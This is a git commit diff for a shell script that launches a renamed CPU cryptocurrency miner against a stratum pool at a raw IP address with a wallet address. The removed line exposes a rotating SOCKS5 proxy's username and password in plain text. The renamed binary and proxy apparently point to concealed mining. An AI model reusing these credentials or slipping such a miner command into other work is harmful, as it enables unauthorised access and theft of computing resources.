e3589b86207af1d5918d2db79b8b76d188467099
bintangming55-max <bintangming55@gmail.com>
2025-12-14 10:11:18 +0700

    Update tani2.sh

--- tani2.sh
+++ tani2.sh
@@ -1,1 +1,1 @@
-./cpulinu -a Yespowerr16  -o stratum+tcp://51.178.76.133:9987 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4
+./cpulinu -a Yespowerr16  -o stratum+tcp://51.178.76.133:9987 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani 
